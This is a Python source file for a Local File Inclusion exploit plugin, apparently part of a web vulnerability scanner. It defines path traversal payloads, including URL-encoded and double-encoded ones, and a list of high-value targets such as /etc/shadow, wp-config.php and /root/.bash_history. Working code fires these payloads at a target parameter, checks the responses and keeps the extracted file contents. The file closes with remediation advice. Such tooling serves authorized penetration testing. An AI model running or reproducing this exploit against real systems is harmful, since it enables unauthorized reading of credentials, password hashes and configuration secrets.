"""
LFI (Local File Inclusion) Exploit Plugin

This plugin provides exploit capabilities for LFI vulnerabilities including:
- File extraction via path traversal
- Log file reading
- Configuration file access
- Source code disclosure
- Visual proof of exploitation with screenshots
"""

import sys
import os
import re
from typing import Dict, List, Any, Optional
import logging

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_generator import get_payload_generator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available")

try:
    from scanner.visual_proof_capture import VisualProofCapture
    from scanner.media_manager import MediaManager
    HAS_VISUAL_PROOF = True
except ImportError:
    HAS_VISUAL_PROOF = False
    logging.warning("Visual proof modules not available")

logger = logging.getLogger(__name__)


class LFIPlugin(ExploitPlugin):
    """
    LFI exploit plugin.
    
    This plugin provides LFI exploitation capabilities including:
    - File extraction via path traversal
    - Sensitive file reading
    - Configuration file disclosure
    - Log file access
    """
    
    # High-value files to extract
    SENSITIVE_FILES = {
        'linux': [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/group',
            '/etc/hosts',
            '/etc/hostname',
            '/etc/issue',
            '/etc/mysql/my.cnf',
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            '/var/www/html/.htaccess',
            '/var/www/html/config.php',
            '/var/www/html/wp-config.php',
            '/home/.bash_history',
            '/root/.bash_history',
            '/proc/self/environ',
            '/proc/version',
            '/proc/cmdline',
        ],
        'windows': [
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\win.ini',
            'C:\\boot.ini',
            'C:\\xampp\\apache\\conf\\httpd.conf',
            'C:\\Program Files\\Apache\\conf\\httpd.conf',
            'C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config',
        ]
    }
    
    # Path traversal techniques
    TRAVERSAL_PAYLOADS = [
        '{file}',
        '../{file}',
        '../../{file}',
        '../../../{file}',
        '../../../../{file}',
        '../../../../../{file}',
        '../../../../../../{file}',
        '../../../../../../../{file}',
        '....//....//....//....//....//....//....//....{file}',
        '..%2f..%2f..%2f..%2f..%2f..%2f{file}',
        '..%252f..%252f..%252f..%252f..%252f{file}',
        '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}',
    ]
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'lfi'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'LFI Exploit'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return (
            'Local File Inclusion exploit plugin for extracting local files '
            'via path traversal and file inclusion vulnerabilities.'
        )
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate LFI payloads based on context.
        
        Args:
            context: Optional context containing:
                    - target_file: File to include (e.g., /etc/passwd)
                    - target_os: Target operating system (linux, windows)
                    - encoding: Encoding to use (url, double_url, etc.)
        
        Returns:
            List of LFI payload strings
        """
        context = context or {}
        target_file = context.get('target_file', '/etc/passwd')
        target_os = context.get('target_os', 'linux')
        
        payloads = []
        
        # Strip leading slash for traversal payloads (only first one if present)
        file_path = target_file[1:] if target_file.startswith('/') else target_file
        file_path = file_path[1:] if file_path.startswith('\\') else file_path
        
        # Generate payloads with different traversal depths
        for payload_template in self.TRAVERSAL_PAYLOADS[:8]:
            payload = payload_template.format(file=file_path)
            payloads.append(payload)
        
        return payloads
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute LFI exploit attack.
        
        Args:
            target_url: The target URL to attack
            vulnerability_data: Dictionary containing vulnerability information:
                              - parameter: Vulnerable parameter name
                              - method: HTTP method (GET, POST, etc.)
            config: Optional configuration dictionary
        
        Returns:
            Dict containing:
                - success: Boolean indicating if attack succeeded
                - extracted_files: Dict of successfully extracted files
                - evidence: Evidence of successful exploitation
                - error: Error message if attack failed
        """
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'lfi',
            }
        
        config = config or {}
        parameter = vulnerability_data.get('parameter')
        method = vulnerability_data.get('method', 'GET').upper()
        
        if not parameter:
            return {
                'success': False,
                'error': 'No vulnerable parameter specified',
                'vulnerability_type': 'lfi',
            }
        
        logger.info(f"Attempting LFI exploitation on {target_url}, parameter: {parameter}")
        
        # Try to extract sensitive files
        exploitation_result = self._attempt_file_extraction(
            target_url, parameter, method, config
        )
        
        if exploitation_result['success']:
            logger.info(f"Successfully exploited LFI on {target_url}")
            
            result = {
                'success': True,
                'extracted_files': exploitation_result.get('files', {}),
                'evidence': exploitation_result.get('evidence', ''),
                'vulnerability_type': 'lfi',
                'message': f'Successfully extracted {len(exploitation_result.get("files", {}))} file(s)',
            }
            
            # Capture visual proof if available
            if HAS_VISUAL_PROOF and config.get('capture_visual_proof', True):
                visual_proofs = self._capture_visual_proof(target_url, parameter, exploitation_result, config)
                if visual_proofs:
                    result['visual_proofs'] = visual_proofs
                    logger.info(f"Captured {len(visual_proofs)} visual proof(s)")
            
            return result
        else:
            logger.info(f"LFI exploitation attempt failed on {target_url}")
            return {
                'success': False,
                'error': exploitation_result.get('error', 'Could not extract files'),
                'message': 'LFI exploitation attempt was unsuccessful',
                'vulnerability_type': 'lfi',
            }
    
    def _attempt_file_extraction(self, url: str, parameter: str, method: str,
                                 config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt to extract files via LFI.
        
        Returns:
            Dict with success status and extracted files
        """
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        extracted_files = {}
        
        # Try Linux files first
        logger.info("Attempting to extract Linux files...")
        for target_file in self.SENSITIVE_FILES['linux'][:5]:  # Try first 5
            result = self._try_extract_file(
                url, parameter, method, target_file, verify_ssl, timeout
            )
            if result['success']:
                extracted_files[target_file] = result['content']
                logger.info(f"Successfully extracted: {target_file}")
        
        # Try Windows files
        logger.info("Attempting to extract Windows files...")
        for target_file in self.SENSITIVE_FILES['windows'][:3]:  # Try first 3
            result = self._try_extract_file(
                url, parameter, method, target_file, verify_ssl, timeout
            )
            if result['success']:
                extracted_files[target_file] = result['content']
                logger.info(f"Successfully extracted: {target_file}")
        
        if extracted_files:
            return {
                'success': True,
                'files': extracted_files,
                'evidence': f'Extracted {len(extracted_files)} file(s): {", ".join(extracted_files.keys())}'
            }
        else:
            return {
                'success': False,
                'error': 'Could not extract any files'
            }
    
    def _try_extract_file(self, url: str, parameter: str, method: str,
                         target_file: str, verify_ssl: bool, timeout: int) -> Dict[str, Any]:
        """
        Try to extract a specific file using various traversal techniques.
        
        Returns:
            Dict with success status and file content
        """
        # Strip leading slash for traversal (only first one if present)
        file_path = target_file[1:] if target_file.startswith('/') else target_file
        file_path = file_path[1:] if file_path.startswith('\\') else file_path
        
        for payload_template in self.TRAVERSAL_PAYLOADS[:6]:  # Try first 6 techniques
            payload = payload_template.format(file=file_path)
            
            try:
                # Prepare request
                if method == 'GET':
                    params = {parameter: payload}
                    response = requests.get(
                        url, params=params, timeout=timeout, verify=verify_ssl
                    )
                else:  # POST
                    data = {parameter: payload}
                    response = requests.post(
                        url, data=data, timeout=timeout, verify=verify_ssl
                    )
                
                # Check if file content is in response
                if self._verify_file_content(response.text, target_file):
                    return {
                        'success': True,
                        'content': response.text[:1000],  # First 1000 chars
                        'payload': payload,
                    }
            
            except Exception as e:
                logger.debug(f"Error extracting {target_file} with payload {payload}: {e}")
        
        return {
            'success': False,
            'error': f'Could not extract {target_file}'
        }
    
    def _verify_file_content(self, content: str, target_file: str) -> bool:
        """Verify if the content contains expected file signatures."""
        # passwd file
        if 'passwd' in target_file:
            return bool(re.search(r'root:.*:0:0', content) or 
                       re.search(r'daemon:.*:', content))
        
        # hosts file
        if 'hosts' in target_file:
            return bool(re.search(r'127\.0\.0\.1', content) or
                       'localhost' in content)
        
        # win.ini
        if 'win.ini' in target_file:
            return '[fonts]' in content or '[extensions]' in content
        
        # Apache/Nginx config
        if 'apache' in target_file or 'nginx' in target_file or 'httpd.conf' in target_file:
            return 'ServerRoot' in content or 'DocumentRoot' in content or 'server {' in content
        
        # MySQL config
        if 'my.cnf' in target_file:
            return '[mysqld]' in content or '[client]' in content
        
        # PHP config
        if 'config.php' in target_file or 'wp-config.php' in target_file:
            return '<?php' in content or 'DB_NAME' in content or 'DB_PASSWORD' in content
        
        # /proc files
        if '/proc/' in target_file:
            return len(content) > 0 and len(content) < 10000  # Reasonable size
        
        # Generic check - if response is not HTML and has reasonable length
        if '<html' not in content.lower() and len(content) > 10:
            return True
        
        return False
    
    def get_severity_level(self) -> str:
        """Return the typical severity level for LFI vulnerabilities."""
        return 'high'
    
    def _capture_visual_proof(self, url: str, parameter: str, 
                               exploitation_result: Dict[str, Any],
                               config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Capture visual proof of LFI exploitation.
        
        Args:
            url: Target URL
            parameter: Vulnerable parameter
            exploitation_result: Results from exploitation attempt
            config: Configuration dictionary
            
        Returns:
            List of visual proof metadata dictionaries
        """
        visual_proofs = []
        
        try:
            proof_capture = VisualProofCapture()
            extracted_files = exploitation_result.get('files', {})
            
            # Capture screenshot of successful file extraction
            if extracted_files:
                # Build URL with successful payload for first extracted file
                first_file = list(extracted_files.keys())[0]
                file_path = first_file[1:] if first_file.startswith('/') else first_file
                
                # Try a few traversal depths
                for depth in range(3, 6):
                    payload = '../' * depth + file_path
                    
                    # Capture screenshot
                    screenshot_data = proof_capture.capture_screenshot(
                        f"{url}?{parameter}={payload}",
                        wait_time=1.0
                    )
                    
                    if screenshot_data:
                        visual_proofs.append({
                            'type': 'screenshot',
                            'data': screenshot_data,
                            'title': f'LFI - Extracted {first_file}',
                            'description': f'Successfully read file {first_file} using path traversal',
                            'exploit_step': f'File extraction with payload: {payload}',
                            'payload': payload
                        })
                        break
            
        except Exception as e:
            logger.error(f"Failed to capture visual proof: {e}")
        
        return visual_proofs
    
    def get_remediation_advice(self) -> str:
        """Return remediation advice for LFI vulnerabilities."""
        return (
            'Prevent LFI attacks:\n'
            '1. Never use user input directly in file paths\n'
            '2. Use whitelists for allowed files or indirect references (IDs)\n'
            '3. Implement strict input validation and sanitization\n'
            '4. Use absolute paths and avoid path concatenation\n'
            '5. Disable allow_url_include in PHP\n'
            '6. Use chroot jails or similar isolation\n'
            '7. Apply principle of least privilege to file permissions\n'
            '8. Remove null byte handling vulnerabilities\n'
            '9. Implement Web Application Firewall (WAF) rules\n'
            '10. Regularly audit file access patterns'
        )
